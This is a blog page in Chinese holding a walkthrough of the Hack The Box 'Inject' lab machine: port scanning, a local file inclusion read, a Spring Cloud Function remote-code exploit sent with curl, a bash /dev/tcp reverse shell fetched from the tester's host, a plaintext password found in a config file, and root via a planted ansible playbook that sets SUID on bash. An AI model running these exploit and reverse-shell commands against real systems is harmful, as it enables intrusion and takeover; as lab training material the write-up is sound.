@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="n3ym4r">
+    
+    <title>
+        
+            injecte靶机 |
+        
+        n3ym4r&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#5ed5cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/logo.svg","font_size":null,"font_family":null,"left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Pay attention to safety!","font_color":null,"hitokoto":{"enable":true}},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block_tools":{"enable":true,"style":"mac"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.9"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               n3ym4r&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">injecte靶机</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">n3ym4r</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-03-23 08:09:00</span>
+        <span class="mobile">2023-03-23 08:09</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-03-23 08:19:49</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%89%93%E9%9D%B6/">打靶</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.8k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>10 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>  这个靶机是HTB近期新出的靶机，整体流程为利用web端lfi漏洞读取文件，发现web服务版本及现有的rce漏洞，利用rce拿到shell，查看信息，发现另一个用户phil的明文密码，登录phil用户，拿到user flag，再通过pspy64找到一个可控的计划任务，进行提权，拿到root flag。</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/Agile/image.4b71rmmbl6c.webp" alt="image"></p>
+<span id="more"></span>
+
+<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><pre><code>┌──(n3ym4r㉿kali)-[~]
+└─$ nmap 10.10.11.204                             
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:20 CST
+Nmap scan report for 10.10.11.204
+Host is up (0.86s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 96.38 seconds
+</code></pre>
+<pre><code>┌──(n3ym4r㉿kali)-[~]
+└─$ nmap -p22,8080 -sC -sV 10.10.11.204
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:23 CST
+Nmap scan report for 10.10.11.204
+Host is up (0.40s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
+|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
+|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.08 seconds
+</code></pre>
+<p>开放了22、8080端口，访问8080web服务</p>
+<h2 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h2><p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/Agile/image.5j8j0vt22tw0.webp" alt="image"></p>
+<p>右上角有一个上传文件按钮，是一个图片上传点</p>
+<p>随便上传一张图片，抓包看看</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/Agile/image.2t06z3jcevs0.webp" alt="image"></p>
+<p>上传成功后，点击查看图片，url中</p>
+<pre><code class="shell">GET /show_image?img=Fpq6zvOWYAIT2EU.jpeg HTTP/1.1
+Host: 10.10.11.204:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.11.204:8080/upload
+Upgrade-Insecure-Requests: 1
+</code></pre>
+<p>bp抓包，可以看到url中会有个img参数去访问我们刚刚上传的图片</p>
+<h2 id="LFI漏洞"><a href="#LFI漏洞" class="headerlink" title="LFI漏洞"></a>LFI漏洞</h2><p>那么，这里就会想到lfi，看是否能包含到本地其他文件</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/Agile/image.1xp9u3dnzczk.webp" alt="image"></p>
+<p>经过多次尝试往回找寻六次目录即可到达根目录下，查看到etc&#x2F;passwd文件</p>
+<p>尝试读取网站源码</p>
+<p>一层一层查找，在WebApp下查看到pom.xml文件</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/Agile/image.5b0ua09a1lo0.webp" alt="image"></p>
+<p>注意右边回显</p>
+<pre><code>        &lt;dependency&gt;
+            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
+            &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
+            &lt;version&gt;3.2.2&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p>可以看到使用了一个3.2.2版本的Spring Cloud Function</p>
+<h2 id="CVE-2022-22965漏洞利用"><a href="#CVE-2022-22965漏洞利用" class="headerlink" title="CVE 2022-22965漏洞利用"></a><strong>CVE 2022-22965</strong>漏洞利用</h2><p>谷歌一下此版本存在<strong>CVE 2022-22965</strong>漏洞</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://sysdig.com/blog/cve-2022-22963-spring-cloud/" >https://sysdig.com/blog/cve-2022-22963-spring-cloud/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/darryk10/CVE-2022-22963" >https://github.com/darryk10/CVE-2022-22963<i class="fas fa-external-link-alt"></i></a></p>
+<p>关于利用，链接写的很明了，我们可以使用curl发包，也可以使用bp</p>
+<p>准备一个简单的反弹shell</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ cat rev.sh    
+#!/bin/bash
+/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.12/4444 0&gt;&amp;1&#39;
+</code></pre>
+<p>开一个监听</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ nc -nvlp 4444            
+listening on [any] 4444 ...
+</code></pre>
+<p>开一个web服务，以提供靶机下载</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ python -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.204 - - [23/Mar/2023 13:53:07] &quot;GET /rev.sh HTTP/1.1&quot; 200 -
+</code></pre>
+<p>靶机下载sh</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ curl -i -s -k -X &#39;POST&#39;  --data-raw &#39;data&#39; -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;wget 10.10.16.12/rev.sh -O /tmp/rev.sh&quot;)&#39; &#39;http://10.10.11.204:8080/functionRouter&#39;
+HTTP/1.1 500 
+Transfer-Encoding: chunked
+Connection: keep-alive
+Content-Type: application/json
+Date: Thu, 23 Mar 2023 06:20:24 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+
+&#123;&quot;timestamp&quot;:&quot;2023-03-23T06:20:24.597+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;&#125;                                                                                           
+</code></pre>
+<p>执行rev.sh</p>
+<pre><code>┌──(n3ym4r㉿kali)-[~]
+└─$ curl -i -s -k -X &#39;POST&#39;  --data-raw &#39;data&#39; -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;/bin/bash /tmp/rev.sh&quot;)&#39; &#39;http://10.10.11.204:8080/functionRouter&#39;
+HTTP/1.1 500 
+Transfer-Encoding: chunked
+Connection: keep-alive
+Content-Type: application/json
+Date: Thu, 23 Mar 2023 06:21:41 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+
+&#123;&quot;timestamp&quot;:&quot;2023-03-23T06:21:41.414+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;&#125;   
+</code></pre>
+<p>得到反弹shell</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ nc -nvlp 4444            
+listening on [any] 4444 ...
+connect to [10.10.16.12] from (UNKNOWN) [10.10.11.204] 59054
+bash: cannot set terminal process group (801): Inappropriate ioctl for device
+bash: no job control in this shell
+frank@inject:/$ whoami
+whoami
+frank
+frank@inject:/$ id
+id
+uid=1000(frank) gid=1000(frank) groups=1000(frank)
+</code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre><code class="shell">frank@inject:/$ ls
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+frank@inject:/$ cd home	
+cd home
+frank@inject:/home$ ls -la
+ls -la
+total 16
+drwxr-xr-x  4 root  root  4096 Feb  1 18:38 .
+drwxr-xr-x 18 root  root  4096 Feb  1 18:38 ..
+drwxr-xr-x  5 frank frank 4096 Feb  1 18:38 frank
+drwxr-xr-x  3 phil  phil  4096 Mar 23 06:12 phil
+frank@inject:/home$ cd frank
+cd frank
+frank@inject:~$ ls -la
+ls -la
+total 28
+drwxr-xr-x 5 frank frank 4096 Feb  1 18:38 .
+drwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..
+lrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
+drwx------ 2 frank frank 4096 Feb  1 18:38 .cache
+drwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local
+drwx------ 2 frank frank 4096 Feb  1 18:38 .m2
+-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
+frank@inject:~$ cd .m2
+cd .m2
+frank@inject:~/.m2$ ls
+settings.xml
+frank@inject:~/.m2$ cat settings.xml
+cat settings.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+  &lt;servers&gt;
+    &lt;server&gt;
+      &lt;id&gt;Inject&lt;/id&gt;
+      &lt;username&gt;phil&lt;/username&gt;
+      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
+      &lt;privateKey&gt;$&#123;user.home&#125;/.ssh/id_dsa&lt;/privateKey&gt;
+      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
+      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
+      &lt;configuration&gt;&lt;/configuration&gt;
+    &lt;/server&gt;
+  &lt;/servers&gt;
+&lt;/settings&gt;
+frank@inject:~/.m2$ 
+</code></pre>
+<p>在home&#x2F;frank目录下的.m2&#x2F;setting.xml文件看到phil用户的明文密码为DocPhillovestoInject123</p>
+<p>切换到phil用户</p>
+<pre><code>bash-5.0$ su - phil
+su - phil
+Password: DocPhillovestoInject123
+whoami
+phil
+pwd
+/home/phil
+id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+ls
+pspy64
+user.txt
+cat user.txt
+814beeeaca90583b280d5130c699eb4c
+</code></pre>
+<p>拿到user flag</p>
+<p>上传一个pspy64，查看正在运行的服务，可以看到有一个在目录 &#x2F;opt&#x2F;automation&#x2F;tasks 上执行 ansible-parallel的任务,此任务会执行&#x2F;opt&#x2F;automation&#x2F;tasks&#x2F;目录下的所有.yml文件，我们可以写入一个恶意.yml文件，使其执行</p>
+<pre><code class="shell">2023/03/23 07:08:01 CMD: UID=0     PID=6173   | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml 
+2023/03/23 07:08:01 CMD: UID=0     PID=6172   | sleep 10 
+2023/03/23 07:08:01 CMD: UID=0     PID=6171   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml 
+</code></pre>
+<p><a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ansible-playbook/#shell" >https://gtfobins.github.io/gtfobins/ansible-playbook/#shell<i class="fas fa-external-link-alt"></i></a></p>
+<p>在此链接看到利用方式</p>
+<pre><code class="shell">TF=$(mktemp)
+echo &#39;[&#123;hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]&#125;]&#39; &gt;$TF
+ansible-playbook $TF
+</code></pre>
+<pre><code class="shell">echo &#39;[&#123;hosts: localhost, tasks: [shell: /usr/bin/chmod +s /bin/bash]&#125;]&#39; &gt;&gt; /opt/automation/tasks/escalate.yml
+whoami
+phil
+bash -p
+
+ls -la /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+/bin/bash -p
+id
+uid=1001(phil) gid=1001(phil) euid=0(root) egid=0(root) groups=0(root),50(staff),1001(phil)
+whoami
+root
+cd root
+ls  
+/bin/bash: line 3: cd: root: No such file or directory
+pspy64
+user.txt
+cd /root
+ls
+playbook_1.yml
+root.txt
+cat root.txt
+b1e8275be264df7aab57f5551b986580
+</code></pre>
+<p>拿到root flag</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li>本文标题：injecte靶机</li>
+        <li>本文作者：n3ym4r</li>
+        <li>创建时间：2023-03-23 08:09:00</li>
+        <li>
+            本文链接：https://n3ym4r.github.io/2023/03/23/HTB-inject/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%89%93%E9%9D%B6/">#打靶</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/HTB/">#HTB</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2023/03/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">信息收集</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/02/25/linux%E6%8F%90%E6%9D%83/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">linux提权</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">n3ym4r</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题
+            &nbsp;
+            <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.9</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-up-right-and-down-left-from-center"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E6%9C%8D%E5%8A%A1"><span class="nav-text">web服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LFI%E6%BC%8F%E6%B4%9E"><span class="nav-text">LFI漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2022-22965%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">CVE 2022-22965漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/code-block-tools.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
